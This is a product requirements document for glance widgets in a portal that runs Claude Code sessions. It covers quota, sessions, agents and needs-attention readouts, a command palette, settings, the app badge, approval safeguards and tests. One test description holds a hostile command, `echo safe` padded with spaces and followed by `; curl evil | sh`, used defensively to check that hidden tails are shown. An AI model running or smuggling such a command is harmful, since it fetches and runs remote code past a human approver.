# PRD: Glance widgets

| | |
| --- | --- |
| Status | **Draft v0.1.** The frame, its settings, the Quota widget, the app shortcuts and the app badge are built and were looked at in Chromium on 2026-10-12 (§14). The Sessions, Active agents, Needs attention and Shortcuts widgets and the server snapshot behind them (§10) are built and were looked at against a real Claude Code (§14). ✅ = observed, 📄 = read from documentation, 🔬 = unverified: needs a real device or a real account. |
| Owner | Alfian Isnan |
| Last updated | 2026-10-13 |
| Depends on | [Claude usage](claude-usage.md) §20 (the snapshot's `pace`, `outlook` and `slot`, and the live topic `claudeusage`), [Web app & PWA](web-app-pwa.md) (shell, manifest, service worker), the shared colour helper `apps/web/src/lib/usage` |
| Related | [Chat sessions](chat-sessions.md), [Tickets](tickets.md), [Local git and CI/CD](local-git-ci.md), [Settings & policies](settings-policies.md) (these settings are per device and live outside that store: §7) |

## 1. Summary

A glance widget is a small readout of something the person keeps asking the portal: how much of the active Claude's plan is left, what is running, what is waiting for them. One frame draws every widget in every place. A widget has a **compact form** (its icon, a number and a status dot: on a phone only the icon and the number show) and a **full form** (a popover on a larger screen, a bottom sheet on a phone, a panel in the side dock). The places are the header, a side dock on wide screens, the top of the Sessions list and the line above the composer. Which widgets show, in what order and where is the person's choice, kept on the device. The installed app gets shortcuts on its icon and a badge with the needs-attention count where the platform has them.

Five widgets ship: **Quota** (§9), **Sessions**, **Active agents**, **Needs attention** and **Shortcuts** (§10); four more, **Workspaces**, **Tickets**, **CI** and **Usage**, came with the **Home page** (§18), the page the app opens on, where every widget with a card shows as one.

## 2. Background and problem

- A plan window runs out in the middle of work, and the answer to "how much is left" is a page away ([Claude usage](claude-usage.md)). The Claude rows show a meter, but only on the Usage page and in the switch dialog.
- What waits on the person (an approval, a human-request ticket, a failed CI run) is found by opening Sessions, Tickets and CI in turn.
- A phone has room for a handful of icons and numbers, not for a dashboard. The owner asked (2026-10-12) for one frame used in many places, with a compact and a full form, live data through the existing live mechanism, and settings for which widgets show and in what order.

## 3. Goals

| ID | Goal |
| --- | --- |
| G1 | **One frame.** A widget is a hook and a component; the header, the dock, the list, the composer line, the popover, the sheet and Settings know no widget by name. |
| G2 | **Phone first.** Icon and number only in the header; the full form is a bottom sheet; 44 px touch targets; checked at 390 px. |
| G3 | **Live, no new polling.** Widgets read stores kept fresh by the live socket. The frame adds no timer that asks the portal anything. |
| G4 | **Honest numbers** ([Claude usage](claude-usage.md) §20, round 4 rule P1). A measured figure stands as it is, an estimate says "est." with its formula in an ⓘ, unavailable data is "-" with the reason in an ⓘ. A projection never changes a measured number. |
| G5 | **Colour is never the only signal.** The dot has a shape per level, the chip's accessible name says the level in words, and the full form says it in text. |
| G6 | **Few words.** One-word labels; explanations in ⓘ (PLAN rule 12). |
| G7 | **One widget cannot break the app.** A chip, a full form or a global part that throws is dropped and logged. |
| G8 | **Installed-app touches.** Shortcuts on the app icon and a needs-attention badge, honest about what the platform and the missing push allow (§11). |

## 4. Non-goals

- **Push notifications.** They do not exist yet ([Web app & PWA](web-app-pwa.md) §11 is a draft; the notification track owns the service worker's push code). The badge is set by the page only.
- **Settings stored on the portal.** The portal has one shared admin sign-in, so a phone and a laptop each keep their own choices (§7).
- **Drag and drop ordering, a list of widgets per place, widgets from outside this repository.** Order is a move up and move down in Settings.
- **A notification centre.** Needs attention lists what is open now; the history is the Notifications page's job when it exists.

## 5. Users and stories

| ID | Story |
| --- | --- |
| US1 | In the header I see "28 %" in yellow: the active Claude has 28 % of its fullest window left. I tap it and see each window, when it resets and, labelled as estimates, how fast it is filling and where it will stand at the reset. |
| US2 | I open a session and the same number sits above the message box, for that session's Claude. |
| US3 | The number is "-" with a hollow dot when the Claude is signed out or not read yet, and nothing at all for a pool or an API key ("no plan limits"). I never see a made-up figure. |
| US4 | On the Sessions page a labelled row shows Quota, Sessions and Needs attention. On a phone the header already shows them, so the page does not repeat them. |
| US5 | On a wide screen I turn the dock on: a rail of chips on the right edge, or every widget in full in a panel that makes room for the page. |
| US6 | I hide Agents, move Needs attention first, and change Quota's yellow to start at 70 %. A reload keeps it, my phone keeps its own. |
| US7 | Long-pressing the installed app's icon offers New session, Sessions and Needs attention. The icon carries the needs-attention count while the app has been open. |
| US8 | With the keyboard alone I reach every chip, open its full form, close it with Escape and land back on the chip. |

## 6. The frame

Code: `apps/web/src/features/glance/`.

### 6.1 The widget interface (`types.ts`)

A widget is one object, registered by one import and one line in `registry.ts`:

| Field | Meaning |
| --- | --- |
| `id`, `label`, `icon`, `about` | A stable lower-case id (stored in settings, used in `?glance=<id>`), a one-word label, a lucide icon, one sentence for Settings' ⓘ. |
| `useCompact(ctx)` | A hook returning `{ value, level, title, count?, stale?, loading? }`: a short text of at most five characters or null, a level (`ok`, `warn`, `critical`, `idle`, `unknown`), the chip's accessible name as one sentence with the state in words. It is called once per place that shows the widget and once for the badge, so it **must read a shared store** and never fetch on its own. |
| `Full` | The full form, the same in every surface; `{ ctx, surface: 'popover' \| 'sheet' \| 'dock', close }`. May be lazy: the frame wraps it in Suspense. |
| `href`, `placements`, `badge`, `Settings`, `Global`, `activate` | Optional: the page behind the widget (an Open button in the full form's header), the places it can be drawn (all by default), whether its `count` feeds the app badge, extra rows under it in Settings, a part mounted once for the whole signed-in app (key listeners, a palette), and an action that replaces "a tap opens the full form". |

`ctx` is `{ focus, placement }`. The **focus** (`focus.ts`) is what the person is looking at, published by a page while it is mounted (`useGlanceFocus`): the session page publishes its session, its Claude and its workspace.

### 6.2 Compact form

The chip is the widget's icon with the status dot on its corner, then the number. The dot's shape adds to its colour: ok a filled circle, warn a diamond, critical a larger rounded square, idle a small faint circle, unknown a hollow ring. A widget with no number and no status (`value` null, `idle`) is the icon alone: no dot, no empty slot. Only a critical number is tinted (yellow text is under 4.5:1 on a light surface; warn is the dot and the title's words). The chip's accessible name and its tooltip are the widget's `title`; a stale reading dims it; loading shows a quiet placeholder and the chip can already be opened. Targets are 40 px, 44 px on a phone (the kit's `tap:` variant).

### 6.3 Places

| Place | Where | Notes |
| --- | --- | --- |
| `header` | The phone app bar (the brand word gives way to its mark while the strip shows); from 640 px the foot of the sidebar | A column of chips on the 80 px rail, a row on the 256 px sidebar. Full forms open to the right of the sidebar. |
| `list` | The top of the Sessions list | Labelled from 640 px. Hidden on a phone while the header strip shows, so the same chips are not said twice. |
| `composer` | The line above the message box in a session | Small chips, right-aligned, hidden while the on-screen keyboard is up. Always the open session's Claude, whatever Quota's mode is. |
| `dock` | The right edge, from 1280 px, when turned on in Settings | A rail of chips with an open button, or a 20 rem panel with every widget's full form stacked. Open, it pads the page (`--glance-dock-w`) instead of covering it. |

### 6.4 Full form

| Surface | When | Behavior |
| --- | --- | --- |
| Popover | From 640 px, from a chip | 344 px wide (the window minus margins when narrower), fixed beside the chip (below, above, left or right by place), kept inside the screen, repositioned on resize and scroll. Not modal: Escape or a tap elsewhere closes it and focus returns to the chip; a tap inside a dialog or an ⓘ note a widget opened does not count as elsewhere. Focus moves in once it is placed. |
| Sheet | Below 640 px, and a `?glance=` deep link at any width | The kit's dialog: a draggable bottom sheet on a phone (a centred modal from 640 px), the widget's label as its title, an Open button in the footer. |
| Dock panel | The open dock | Each widget in a card under a heading with the Open arrow; no close button (the dock closes as a whole). |

One full form is open per strip at a time; it closes when the page changes. A full form is the same content in all three; only the frame around it differs.

### 6.5 Mounting and links

`GlanceRoot` is mounted once in `App.tsx`, over every page (so also over the full-screen session page), while signed in. It mounts each widget's `Global`, opens a deep link and feeds the app badge. `?glance=<id>` on any `/admin` URL opens that widget's full form as a sheet and then removes the parameter (a reload does not reopen it; an unknown id is ignored). `/admin/sessions?new=1` opens the New session dialog and is removed the same way. Both survive the sign-in redirect, which keeps the query.

### 6.6 Failure isolation

Every chip, full form, global part and badge feed sits in a `Quiet` boundary: a widget that throws is dropped (a full form shows one line, "Could not show this.") and logged to the console, and the rest of the frame carries on.

## 7. Settings

Per user and per device, in `localStorage` under `claudepilot.glance.<userId>` (`u_owner` while the portal has one shared sign-in), kept in step across tabs by the `storage` event; when the browser refuses storage they hold for the tab. Nothing is sent to the portal and there is no migration. Settings page, section **Glance** (one ⓘ says they are kept on this device; a reset arrow shows when anything differs from the defaults):

| Setting | Default | Notes |
| --- | --- | --- |
| Widgets: shown or not, and the order | All shown, registry order | Switch per widget and a move up and a move down (touch-friendly, no dragging). A widget added later follows the ones already placed. |
| Places: Header, Sessions page, Composer, Side dock | Header, Sessions page and Composer on; the dock off | The dock takes the right edge of every page, so it is a choice. |
| App badge | On | Shown only where the browser has the Badging API. |
| Quota: Mode | Active | Active: the open session's Claude, else the one used last. All: the chip shows the Claude with the least left and the full form lists every Claude open. |
| Quota: Warn, Critical | 80 and 95 | Percent of a window used at which Quota turns warn and critical; whole numbers with 1 ≤ Warn < Critical ≤ 100, otherwise the field reverts. The defaults are the portal's alert levels (`USAGE_THRESHOLDS`); the toasts keep using those. |
| Dock open | Closed | Rail or panel. |

Stored values are validated on read: a malformed field falls back to its default on its own and never throws.

**Multi-user** (round 10). Which widgets show, their order, the places, Quota's mode and its colour thresholds are preferences of a person, not platform settings, and none of them is a policy. The key already carries the user id (`user.ts`: one constant today), so two people on one browser never read each other's choices; the object is plain validated JSON and can move to the portal, per user, without changing shape. Nothing here needs the rights layer: a widget shows only what the portal returns to the viewer.

## 8. Functional requirements

| ID | Area | Requirement | Status |
| --- | --- | --- | --- |
| FR1 | Frame | `GlanceWidget` and a registry (§6.1); the frame names no widget. | **Built** |
| FR2 | Compact | Icon + number + dot, a dot shape per level, the icon alone for an idle widget with no number, accessible name = `title`, stale dimmed, loading placeholder (§6.2). | **Built** |
| FR3 | Full | Popover, bottom sheet and dock panel with the same content (§6.4). | **Built** |
| FR4 | Places | Header, list, composer and dock (§6.3). | **Built** |
| FR5 | Data | Compact hooks read shared stores; the frame has no timer that asks the portal. | **Built** |
| FR6 | Settings | Widgets and their order, places, app badge, Quota mode and thresholds, per device (§7). | **Built** |
| FR7 | Links | `?glance=<id>` and `?new=1` (§6.5). | **Built** |
| FR8 | Isolation | A failing widget is dropped, not the page (§6.6). | **Built** |
| FR9 | Quota | Compact and full form with the basis of every figure (§9). | **Built**, and checked against the portal's own pace figures ([Claude usage](claude-usage.md) §20.2, §14) |
| FR10 | Shortcuts | Manifest shortcuts: New session, Sessions, Needs attention (§11). | **Built**, 🔬 on a device |
| FR11 | Badge | The needs-attention count on the app icon through the Badging API (§11). | **Built**, 🔬 on a device; fed by the Needs attention widget (§10.3), checked in a browser with a spy on the Badging API |
| FR12 | Other widgets | Sessions, Active agents, Needs attention, Shortcuts (§10). | **Built** (FR14 to FR20) |
| FR13 | Access | Every chip and full form reachable by keyboard and touch; Escape returns focus; reduced motion honoured by the kit's dialog (§12). | **Built** |
| FR14 | Snapshot | One read-only request, `GET /api/glance`, answers all three data widgets: counts are whole, lists carry the few top items, a block that could not be read is `ok: false` and empty, never zero. The live topic `glance` says when to ask again; the portal builds it once per person, only after something changed, and pushes only when what a page would draw is different (§10.5). | **Built** |
| FR15 | Sessions | Running count and a dot for "waits for you"; the full form lists up to eight sessions by need with state, Claude, place and age, and a tap opens one (§10.1). | **Built** |
| FR16 | Agents | Workers a session started and sub-agents running inside sessions, as a tree under their session, with Stop on each that runs (§10.2). | **Built** |
| FR17 | Attention | Open requests, tickets assigned to a person and failed CI runs that still stand, added up for the chip and the app badge; each item opens its source (§10.3). | **Built** |
| FR18 | Shortcuts | The icon alone; a tap, or Ctrl/Cmd+K, opens a quick search over sessions, workspaces, tickets, pages and actions, usable by keyboard and by touch (§10.4). | **Built** |
| FR19 | Answering | Allow, Deny and Stop go through the chat socket's own messages, the same door as the session page; Allow only for a request whose whole text is shown and has been read to its end; otherwise Open to review and Deny (§10.6). | **Built** |
| FR20 | Actors | Every read of a session, request, task, ticket or CI run is made on behalf of an actor and kept to what that actor may see; one snapshot per actor (§13). | **Built** for the single owner and tested with two fake users |

## 9. Quota widget

Files: `widgets/quota/`. It reads the shared snapshot of the Usage page (`useClaudeUsage`: one request however many chips are on screen, refreshed on the live topic `claudeusage`), so it asks the portal for nothing of its own.

### 9.1 Which Claude

The **active Claude**: the open session's (the session page publishes it), else the one used most recently, else the first with plan limits, else the first; always chosen among the Claudes the portal returned to this viewer and that they may use (an id that is not among them, such as a stale focus, is ignored; `mayUse` is the seam for a viewer who may only look at a Claude, true for every listed Claude today). "Used most recently" is the Claude of the session with the latest `lastActivityAt` among the open ones: one read of the sessions list when the first chip needs it, again when a `claudeusage` push arrives (at most every 30 s) and when the tab comes back after a minute away. In the composer place the open session's Claude always rules; in all-Claudes mode the chip shows the Claude with the least left instead (its name is in the title), and the full form leads with that same Claude.

### 9.2 Compact form

| Part | Rule | Basis |
| --- | --- | --- |
| Number | Percent **left** of the fullest window that has a number: 100 minus the percent Claude Code reported, whole ("28 %"). "0 %" when nothing is left (a per-model window at 100 % counts, though the Claude still runs other models), "<1 %" for under half a point, "-" without a plan reading. The window is the one the portal's `headroomFrom` calls limiting, so the chip, the Claude rows and the switch dialog agree. | measured (arithmetic on a stored reading) |
| Level | The percent used against this device's thresholds: below Warn ok, from Warn warn, from Critical critical; a used-up Claude is critical. A projection from the portal that says "over" (it will run out before it resets) turns an ok dot to warn, never the number. | measured; the projection is an estimate and says so in the title |
| Old windows | A window whose reset time has passed no longer counts (its number is old). | measured |
| No number | A pool or an API key: the icon alone (idle, "no plan limits"). Signed out, not read yet, no Claudes, or a failed load: "-" with a hollow dot. While loading: a placeholder. | unavailable |
| Title | "Quota, Default: 30 % left of Week, resets Tue 01:26 (in 19 h 59 m), low", plus ", projected to run out before the reset (est.)" and ", old reading" when they apply. | |

### 9.3 Full form

The active Claude with its colour swatch (the Usage page's palette, from the snapshot row's `slot`; grey when none), its plan and, when the reading is old, how old. A row per window: label, meter, percent used, time to reset. The row opens: when it resets (the device's clock), **Speed** (percentage points an hour), **Pace** (the percent it should stand at when it resets, with "under quota" or "over quota" in words) and, when it will run out first, **Runs out** (the time, and in how long). The window the projection is about, else the fullest, is open at first.

| Figure | Basis | Label |
| --- | --- | --- |
| Percent used, reset time | measured | none |
| Speed, projected percent at the reset, the time it runs out | estimate | "est." with the formula in an ⓘ ([Claude usage](claude-usage.md) §20.2) |
| Any of them without data | unavailable | "-" with the portal's reason in an ⓘ (`reasonText`) |
| A window without `pace` (a portal that does not send it) | | The rows are not drawn: absent is not "unavailable" |

Few readings add "Few readings so far: rough." to the speed's ⓘ. Other Claudes follow, one line each (its swatch, name, the fullest window's bar and what is left): open in all-Claudes mode, behind "Others" otherwise; a pool, an API key, a signed-out or an unread Claude says that in one line with the reason in an ⓘ. Open goes to Usage > Claudes. The even-pace figure stays on the Usage page.

## 10. The other widgets

Written by the agent that built them (round 4, U4). Four widgets read ONE snapshot of the portal, `GET /api/glance` (§10.5), kept fresh by the live topic `glance`: no widget asks the portal on its own, and the frame's compact hooks only read the shared store (`widgets/shared/store.ts`, the pattern of `useClaudeUsage`). Every figure is a count of stored rows, measured, never an estimate; what could not be read says so.

### 10.1 Sessions

- **Compact.** The number of sessions running (working or starting), `99+` above 99; the dot is amber while any session waits for you, green while some run, grey when none; the title says it in words: "Sessions: 3 running and 1 waiting for you, 8 open". Loading is a placeholder, an unreadable source is "-" with a hollow dot.
- **Full.** Up to eight sessions, by need (waiting, interrupted, working or starting, idle, ended; the latest activity first within each; archived ones left out), each with its state as a dot and in words, its title, its Claude's colour (the shared swatch of `lib/usage`), where it runs and how long ago; a waiting session says what it asks ("Run a command: npm test"). A tap opens the session and closes the form. "+N more" when more are open. Empty: "No sessions." and the one action, New session. Drawn in the header and the dock only: on the Sessions page and beside a composer it would repeat what is already on screen.

### 10.2 Active agents

- **What counts.** A worker (a session another session started, `parentId`) that is working, starting or waiting, plus every sub-agent task running inside a session. A parent shown for context is not counted; a plain session with nothing under it is not an agent (it is in Sessions). Tasks exist only for a live process: a sleeping or lost session has none.
- **Compact.** The count; amber while any worker waits for an answer; "Agents: 4 running and 1 waiting for you".
- **Full.** The tree depth first: a session, its running tasks (type and how long), its workers and theirs, up to 16 rows ("+N more"). A running row has Stop: a task is stopped by its id (`stop_task`), a working session or worker has its turn interrupted, exactly what the session page's Stop does. A waiting worker has none: answer it in Needs attention. After the portal accepts a stop the row's Stop stays away for 15 s, as the Agents panel does. It never ends or deletes a session (End stays in the Sessions list).

### 10.3 Needs attention

Its `count` feeds the app badge (§11).

- **What counts.** (1) Open requests of sessions that are neither ended nor archived; (2) tickets assigned to a person and not closed (the tickets PRD's "Needs you"); (3) failed CI runs that still stand: the latest run of its pipeline on its branch that is not cancelled, failed, finished within three days (`GLANCE_CI_WINDOW_MS`). A later run that passed, or is queued or running, takes the failure off; a branch counts once; a tag has no later run to ask about, so its failure stands for the window.
- **Compact.** The sum. Red while a request waits (a session is stopped on it), amber for the rest, grey for none. A source that could not be read is named in the title and not added ("Needs attention: 1 approval (CI could not be read)"); all three unreadable is "-". `count` is the same sum, for the badge.
- **Full.** Requests first, the one waiting longest first, then tickets (`T-12`, summary, priority, age), then failed runs (repo · pipeline #n, branch · why, age). Each item opens its source; "+N more approvals / tickets / failed runs" when the counts exceed what is listed (six requests, five tickets, five runs). A request is answered here as §10.6 says.

### 10.4 Shortcuts

No number and no status: the icon alone. Its `Global` part holds the Ctrl/Cmd+K listener and the palette; the chip's `activate` opens the palette instead of a popover; the full form (the dock's panel, `?glance=shortcuts`) lists Search and New session.

- **The key.** Cmd+K on a Mac (Ctrl+K is the text field's kill-line there), Ctrl+K elsewhere, with no other modifier (Ctrl+Shift+K is a browser's console); not while an input method composes; not in the workspace terminal, which keeps Ctrl+K for the shell; the same key closes the palette. The browser's own use of the key is held back only when the palette takes it.
- **The palette.** A dialog with a field and a list, pinned to the visible viewport so a phone's keyboard never covers the field. It lists actions (New session; Needs attention, Quota and Agents, which open that widget's full form on the page you are on through `?glance=`), the sidebar's pages, sessions (not archived; found by title, and by Claude, branch, ticket or id), workspaces (a running one opens its shell, else the Workspaces page, and the row says which) and tickets (the portal's text search while you type; `T-12` goes straight to the ticket). Nothing typed: the actions, the five sessions used last, then the pages.
- **Ranking, written down.** Every word must be found. A word scores 120 for an exact title, 100 for a title that starts with it, 60 for a word of the title, 30 inside the title, 10 beside the title (the row's second line, a Claude's name, a branch); the words add up. Ties: actions, pages, sessions, tickets, workspaces, then the latest used. At most six of a kind and twelve in all, so a hundred sessions cannot push the pages out. A ticket the portal found for the words stays listed below real matches.
- **Keyboard and touch.** Type, Up and Down (they wrap), Enter, Escape; Tab stays inside the dialog (the field and Close); a tap does what Enter does. A combobox with a listbox and `aria-activedescendant`; the active row has a 2 px outline, not only a tint; a polite "N results" for screen readers. It opens with a 150 ms fade and an 8 px rise (none under reduced motion).
- **Data.** Sessions and workspaces are read when it opens (the lists the Sessions and Workspaces pages already read), tickets as you type (debounced 220 ms). Nothing is stored on the device.

### 10.5 The snapshot and the live topic

- **The snapshot.** `GlanceSnapshot` (`packages/contracts/src/glance.ts`): `sessions` {ok, running, waiting, open, items (8)}, `agents` {ok, running, waiting, rows (16), more}, `attention` {count, approvals {ok, count, items (6)}, tickets {ok, count, items (5)}, ci {ok, count, items (5)}}. A count is whole, however few items are listed. A block that could not be read is `ok: false` and empty.
- **The portal.** `apps/server/src/glance`: `build.ts` (pure over its sources, tested with hand-computed fixtures), `authz.ts` (the reads, §13), `service.ts`, `routes.ts`. The service keeps one snapshot per person, rebuilds it after a change (the chat controller's `session`, `tasks`, `removed`, request and resolved events; the tickets and CI `onChange` hooks, chained), debounced 400 ms, and publishes the live topic `glance` ("changed, load again", like `tickets` and `ci`) only when what a page would draw is different. While no page watches the topic it builds nothing: the next request does. No migration, no new socket type, no timer, no poll.
- **The page.** `useGlance()` reloads on first use, on each push and when the live socket comes back, one request at a time however many chips ask. With the socket down for 45 s the chips dim and a full form says "May be out of date." with Refresh.
- **Live lists stay still** (QA standard A9). While the pointer is over a list or focus is inside it, its rows are held exactly as they are: a row that leaves (a request answered somewhere else, an agent that finishes) stays in its place, dimmed and inert ("No longer waiting", "Finished"), a new row waits until the person lets go, and the rows that remain are updated in place (`widgets/shared/steady.ts`). A popover that is anchored by its bottom edge would otherwise move every row when one is added, and a press aimed at one request would land on the next. As a second guard the buttons that answer a request or stop an agent are off for 500 ms after a list changes (the session's approval card ignores input for 500 ms the same way). An answered request keeps its height and its text and says "Allowed" or "Denied" where its buttons were.
- **Dynamic text and numbers.** Every text child of a row is `min-w-0` and truncates with an ellipsis (a title, a Claude's name, a branch), carries its full text as the link's name and `title`, and is `dir="auto"` so Arabic and Hebrew read right to left; unbroken values wrap anywhere; numbers are tabular, a chip reads `99+` and a "+N more" link reads `+1.3k more`. The block of an approval's text scrolls inside a fixed maximum height.
- **States of a full form.** Rows in the list's shape while the first reading is on its way; a failed load says "Could not load." with Try again; a refusal (403) says "Not allowed." without a retry; an unreadable block says which; an empty list is one short line.

### 10.6 Answering from a widget

The widget shows what is being approved and keeps every rule of the call it makes ([Chat sessions](chat-sessions.md) FR25a).

- **What is shown.** The tool's title, then the whole text asked about in a monospace block that wraps and scrolls (focusable, so the keyboard can scroll it), the sub-agent that asked, and the session (a link, with its Claude's colour) and how long it has waited. For a command that is the command exactly as it will run; for the file tools the path; for an unknown tool its whole input as JSON.
- **When Allow is offered.** For a tool request whose text is there and whole (`requestReview`: not empty, not cut at 8,000 characters), and it can be pressed once the block has been read to its end when it does not fit ("Scroll to the end to allow."). Otherwise the row offers Open to review and Deny, with one line saying why ("Too long to show in full.", "Nothing to show for this request.", "Open to read it first." for a question or a plan). There is no Allow for session here. Deny is always there.
- **How.** The chat socket's own `respond`, over a short connection of its own settled on its ack: the same call the session page makes, so the request must still be open, the chat must not be moving, and the portal refuses an Allow for what was not shown whole whoever sends it. Bypass and its re-check are other calls, never made here. Stop is the socket's `control` `stop` or `stop_task` the same way. There is no glance route for any of it: a second door would have to repeat these rules.
- **After.** The row says "Allowed" or "Denied" until the next snapshot drops it (eight seconds at most); a refusal ("no longer open", usually answered elsewhere) is shown as a toast and the snapshot is read again.

## 11. App shortcuts and badge

| Item | What it does | Platforms |
| --- | --- | --- |
| Manifest `shortcuts` | New session (`/admin/sessions?new=1`), Sessions (`/admin/sessions`), Needs attention (`/admin/sessions?glance=attention`). Each uses the app's 192 px icon. The last one opens the Needs attention widget's full form (§10.3). | 📄 Android (long-press the icon), desktop Chrome and Edge (the icon's menu), macOS Safari; not iOS ([Web app & PWA](web-app-pwa.md) §10.1) |
| App badge | The sum of the `count` of every widget with `badge: true` is written with `navigator.setAppBadge(n)`; 0 clears it (`clearAppBadge`). It is written only when every such widget has reported, so a slow one never clears the number; it is cleared on sign-out. Switch: Settings > Glance > App badge. | 📄 Chromium on desktop (installed app), Safari 16.4 and later for Home Screen apps after notifications are allowed; Firefox has none. 🔬 Android shows a dot rather than the number. |

Limits, stated plainly: the page writes the badge, so it **is set while the app is open and stays as it was when it closes**: with no push there is nothing to update it, and it can go stale until the app is opened again. Keeping it true while the app is closed needs a service worker woken by a push ([Web app & PWA](web-app-pwa.md) §11), which is not built and not part of this PRD. `apps/web/public/sw.js` is untouched (an offline page only).

## 12. Accessibility and phone

- Every chip is a button named by its `title`, with `aria-haspopup="dialog"` and `aria-expanded`; the popover is a labelled dialog; Escape closes it and focus goes back to the chip; the sheet is the kit's dialog (focus trap, Escape, drag to close).
- Touch targets 44 px on a phone. The ⓘ notes are the shared `InfoTip` (a button that opens on tap and by keyboard).
- Light and dark use the app's tokens only; the dot's colours pass 3:1 against both surfaces (graphical objects), and text colours pass 4.5:1 or are not used for text (§6.2).
- The kit's dialog and the page transitions follow `prefers-reduced-motion`; the popover has no animation.

## 13. Security and privacy

- The frame adds no route and no table. Quota reads `GET /api/claude-usage` and the sessions list, both behind the session guard.
- A chip's text carries a Claude's display name and numbers, never an account name, email or token ([Claude usage](claude-usage.md) G2). The app badge is a number.
- A deep link only selects a registered widget by id; it opens nothing by itself, and an approval or any action in a widget keeps the rules of the call it makes.
- Settings hold ids, flags and two numbers.
- The aggregator adds one read-only route, `GET /api/glance`, behind the session guard (declared with the authorization seam's `declarePolicies`), and no table; the approval text column is the chat's (migration 190, [Chat sessions](chat-sessions.md) FR25a).
- **Multi-user** (`docs/prd/multi-user.md`). Every read is made on behalf of an actor from the authorization seam: one function per kind of object in `glance/authz.ts` (sessions the actor may view; the requests of a session the actor may operate, since seeing a session is not enough to answer for it; tasks; tickets; CI runs), and a snapshot is built and kept per actor. The route reads `actorOf(c)`, never a header or a body. Today the one owner sees everything; eight tests with two fake users and registered resolvers show that B cannot see, count or answer A's sessions, requests, tickets or runs, that a session shared at view shows to B while its requests stay A's to decide, and that an agent's token sees only its own session. Answering is not here: the widget uses the chat socket's `respond`, so the one `can(actor, 'operate', session)` that guards the session page guards the widget, and the actor-id audit of an approval is the controller's, written once for every door.
- Text from a workspace (a command, a commit subject, a session title) is untrusted: shown as text, never as markup; the approval text shows control, bidirectional and invisible characters as `⟦U+202E⟧`.

## 14. Testing

Server, `npm test -w @portal/server` (33 tests in `src/glance`, the rest beside them):

| File | Checks |
| --- | --- |
| `glance/build.test.ts` | One fixture, worked out by hand: sessions a (working), b (waiting, 2 requests), c (idle), d (ended), e (archived), f (starting), g (interrupted), w1 and w2 (workers of a), w3 (worker of w1, waiting). Running 3 (a, w1, f), waiting 2 (b, w3), open 8, listed by need then recency as w3, b, g, f, w1, a, w2, c (d falls off the cap of eight, e is archived). Agents: rows a, a/t1, w1, w3, c, c/t3 with 4 counted (tasks t1 and t3, workers w1 and w3), Stop on a, a/t1, w1 and c/t3 and not on a waiting worker; a worker whose parent has ended is a plain session; a parent chain that loops is not drawn and does not hang; 21 rows list 16 and say 5 more. Requests: the one waiting longest first (9, 6 and 4 minutes ago), 3 in all, none from ended or archived sessions, 8 asked list 6; the text asked about passes on exactly (150 spaces kept, newlines kept) while the one-line summary is folded; a cut request and one with no text say so; a sub-agent is named by what it does, never by its tool-call id. Attention 3 + 7 + 2 = 12; a ticket summary is folded and cut at 140; an unreadable source is `ok: false` and not zero while the others stand. Failed CI over ten runs: R6, R3 and R10 stand (R1 fixed by a pass, R8 running again, R4 the same branch as R3, R5 outside three days, R7 cancelled does not clear R6, a tag stands), the count is whole with fewer listed, and runs pushed out of the newest listing are asked about branch by branch with the same answer. |
| `glance/service.test.ts` | One build however many ask, again only after a change; a burst is one build and one push, the same snapshot is not pushed; nothing is built while no page watches; `stop()`; the fingerprint ignores when it was built; which controller messages count (state, requests, tasks, deletions; never the token stream); `createGlance` follows the controller; the sources ask tickets as the person and treat a session gone as having no tasks; two people's snapshots are built and kept apart and one push tells the pages; two users' jobs of the same name never share one; the route answers the seam's actor, the owner for a request that passed the session guard, nobody for one without (401), and a header is never an identity. |
| `glance/authz.test.ts` | With resolvers for sessions, tickets and CI runs registered and two fake users: A sees A's sessions, requests, tickets and runs (the ticket count is only what A can see) and nothing of B's or of a session nobody owns; B sees B's own and a session shared at view, but not its requests; a third user sees only what is public; the founding user is a user like the rest once ownership decides; an anonymous actor gets an empty snapshot and nobody's data; an agent's token sees only its own session; a job acts with its user's rights; the route is declared. |
| `chat/approvalText.test.ts` | The text asked about: a command of `echo safe`, 150 spaces and `; curl evil \| sh` is kept exactly and its tail is in it, while the one-line summary folds it and a 245-character one cuts the tail off; newlines and tabs stay; control, bidirectional and invisible characters become `⟦U+202E⟧`; the cap is exact (8,000 whole, 8,001 cut), a credential straddling it is redacted before the cut, an emoji is never split; each tool's field, the file tools show the path and not the contents, an unknown tool and a known one without its field show their whole input as JSON, no input is nothing. In a live session: the text is stored with the request, redacted, reaches tabs in the request event, an Allow works for a whole one; a request cut at the cap can be denied and nothing else (409 for Allow and Allow for session, the request stays open); one with no input, or older than the column, can only be denied. |
| `live.test.ts` | A tab that subscribed to `glance` is told once for a burst, one that did not is not, and `watching` says whether anyone listens. |

Web, `npm test -w @portal/web`:

| File | Checks |
| --- | --- |
| `settings.test.ts` | Defaults carry 80 and 95; malformed stored fields fall back one by one; thresholds must be whole, in 1 to 100, Warn below Critical; the person's order first, new widgets after, switched-off ones dropped unless asked; move up and down stop at the ends. |
| `widgets/quota/quota.test.ts` | Hand-computed fixtures. Session 41 % and week 18 %: 59 % left, the session limits; 96 % used: 4 % left, critical; thresholds at 40 and 60 make 41 % warn; the active Claude order; "-" and no number for signed out, unread, pool, none, loading and failed; a window past its reset no longer counts (week 18 % gives 82 %); used up is 0 %, 99.6 used is "<1 %", 99.5 is "1 %", a model window at 100 % is 0 %; all-Claudes mode picks the least left (4 %); a projection of "over" turns an ok dot to warn and leaves the number; the lead window; the most recently used Claude (archived sessions and bad times skipped). |
| `badge.test.ts` | Sum of whole non-negative counts; unknown until every widget reported; set above 0, clear at 0, a missing or refusing API is a quiet false. |
| `popover.test.ts` | Placement below, above, left and right of a chip, clamping at the margins, from a 1280 px and a 390 px window, computed by hand. |
| `chip.test.ts` | The icon alone for an idle widget with no number; the dot with a number or a status. |
| `registry.test.ts` | Unique lower-case ids, one-word labels, a sentence for `about`, valid parts for every registered widget. |
| `widgets/shared/chatCall.test.ts` | An answer is the socket's `respond` message sent once the connection opens and settled on the ack keyed by the request id; Deny is the same with deny and Allow for session is never sent; a refusal is the portal's words and code; an error for this session settles it, one for another does not; a drop, an unreachable portal and silence each fail and say so; a late ack changes nothing; Stop is `control stop` and Stop on a task `stop_task` with its id. |
| `widgets/shared/format.test.ts` | `99+`, plurals, "now / 7m / 3h / 2d / 2mo" and "<1m / 1m / 59m / 3h / 2d" from fixed times, a title's parts joined, a count for a narrow place (999, 1k, 1.1k, 10k, 1M). |
